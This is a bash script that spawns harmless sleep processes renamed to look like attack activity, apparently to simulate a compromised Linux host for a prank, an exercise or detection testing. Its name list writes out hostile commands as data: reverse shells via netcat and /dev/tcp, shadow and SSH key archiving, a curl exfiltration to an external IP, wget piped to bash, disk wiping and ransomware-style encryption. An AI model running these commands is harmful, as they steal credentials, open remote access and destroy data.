#!/bin/bash
# An array of terrifying, panic-inducing process names
SCARY_NAMES=(
    # Fake Crypto Miner
    "./xmrig --donate-level 1 -o stratum+tcp://pool.supportxmr.com:3333"
    
    # Fake Reverse Shells
    "nc -e /bin/bash 192.168.1.200 4444"
    "python3 -c import pty;pty.spawn('/bin/bash')"
    
    # Fake Kernel Module / Rootkit Masking
    "[kworker/u4:2_crypto]"
    "[kthreadd/.system_update]"
    
    # Fake Credential Dumping
    "/tmp/mimikatz_linux_x64"

    # Simulates packing up the shadow file (passwords)
    "tar -czPvf /dev/shm/system_bak.tar.gz /etc/shadow /etc/passwd /root/.ssh/"
    
    # Simulates actively sending data to an external server
    "curl -X POST -H 'Content-Type: application/json' -d @/dev/shm/system_bak.tar.gz http://185.119.81.22/api/v1/upload"
    
    # Simulates a raw database dump
    "mysqldump -u root -p --all-databases > /tmp/db_dump.sql"

    # The most famous Linux privilege escalation checker
    "./linpeas.sh -a"
    
    # A famous tool for snooping on other users' processes
    "./pspy64 -p -i 1000"
    
    # Sliver (A highly popular modern Command & Control framework)
    "/var/tmp/sliver-server --mtls 10.0.0.50:8888"
    
    # Standard Metasploit Reverse Shell
    "elf-meterpreter-reverse-tcp-4444"

    # Simulates zeroing out the entire primary hard drive
    "dd if=/dev/zero of=/dev/sda bs=1M"
    
    # Simulates a mass file deletion in progress
    "find / -type f -name '*.log' -exec rm -f {} +"
    
    # Simulates a ransomware encryption loop
    "openssl enc -aes-256-cbc -in /var/www/html/index.php -out /var/www/html/index.php.enc"

    # A classic sneaky reverse shell using bash
    "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1"
    
    # Base64 encoded python command (Looks incredibly suspicious)
    "python3 -c exec(__import__('base64').b64decode('aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKQ=='))"
    
    # Downloading a script directly into memory without saving to disk
    "wget -qO- http://10.0.0.50/payload.sh | bash"
)

# Loop through each name and spawn a "sleep" process that lasts for 2 hours (7200 seconds)
for name in "${SCARY_NAMES[@]}"; do
    # 'exec -a' renames the process in memory. '&' pushes it to the background.
    bash -c "exec -a '$name' sleep 7200" &
done